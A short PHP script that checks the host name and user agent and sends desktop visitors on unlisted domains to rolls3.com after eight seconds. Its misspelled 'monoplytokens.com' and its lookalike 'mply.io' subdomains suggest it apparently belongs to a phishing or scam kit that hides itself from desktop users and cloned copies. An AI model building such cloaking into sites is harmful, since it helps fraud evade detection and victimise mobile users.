<?php
$originalDomain = "monoplytokens.com";
$redirectURL = "https://www.rolls3.com/";
$blockedDomains = [
    "jsdhjjhhjjhejkjkas.blogspot.com",
    "mply.io.t0ke2n.site",
    "mply.io.1arshg4.site",
    "mply.io.4a6b8dh.site"
];

$currentDomain = $_SERVER['HTTP_HOST'];

if ($currentDomain !== $originalDomain && $currentDomain !== "www." . $originalDomain && !in_array($currentDomain, $blockedDomains)) {
    if (!preg_match("/iPhone|iPad|Android/i", $_SERVER['HTTP_USER_AGENT'])) {
        header("Refresh: 8; url=" . $redirectURL);
        exit();
    }
}
?>
